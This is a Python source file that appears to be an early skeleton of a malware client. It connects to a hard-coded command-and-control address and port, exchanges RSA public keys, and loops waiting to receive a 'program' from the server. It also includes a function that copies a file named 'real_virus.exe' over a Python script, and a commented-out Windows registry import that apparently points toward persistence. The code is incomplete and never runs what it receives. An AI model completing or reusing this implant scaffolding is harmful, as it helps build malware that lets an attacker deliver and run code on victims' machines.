import socket
import os
import subprocess
import time
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
# import winreg as wrg
import logging
import shutil

log = logging.getLogger(__name__)

CCIP = "127.0.0.1"
CCPORT = 5555


class Cryptography:

    def __init__(self):
        self.keyPair = RSA.generate(2048)
        self.publicKeyPEM = self.keyPair.publickey().exportKey()
        self.manager = PKCS1_OAEP.new(self.keyPair)

    def encrypt(self,message):
        return self.manager.encrypt(message.encode("utf-8"))
    
    def decrypt(self,cyphertext):
        return self.manager.decrypt(cyphertext).decode()

    def getPublicKey(self):
        return self.publicKeyPEM


class Communication:
    def __init__(self):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def conn(self, CCIP, CCPORT):
        try:
            self.client.connect((CCIP, CCPORT))
            log.info('connected')
        
        except Exception as e:
            log.error(e)

    def send(self, message):
        try:
            self.client.send('invio qualcosa\n'.encode()) 
            self.client.send(message)
            log.info(f"Sending... {message}")

        except Exception as e:
            log.error(e)


    def receive(self):
        try:
                while True:
                    data = self.client.recv(1024).decode().strip()
                    log.debug(f"received{data}")
                    if (data):
                        return data
        except Exception as e:
            log.error(e)

def copyFile():
    shutil.copyfile('./real_virus.exe', './demo1.py')


if __name__ == "__main__":
    logging.basicConfig( 
                        level=logging.DEBUG, 
                        format='%(asctime)s: %(levelname)s, %(message)s' )
    log.info("Starting")

    communication = Communication()
    crypto = Cryptography()

    communication.conn(CCIP, CCPORT)
    communication.send(crypto.getPublicKey())
    
    while True:
        log.info("inside while")
        
        log.info("waiting for server public key...")
        serverPublicKey = communication.receive()
        log.debug(serverPublicKey)

        log.info("waiting for program...")
        data = communication.receive()
        log.debug(data)
  
        time.sleep(3)        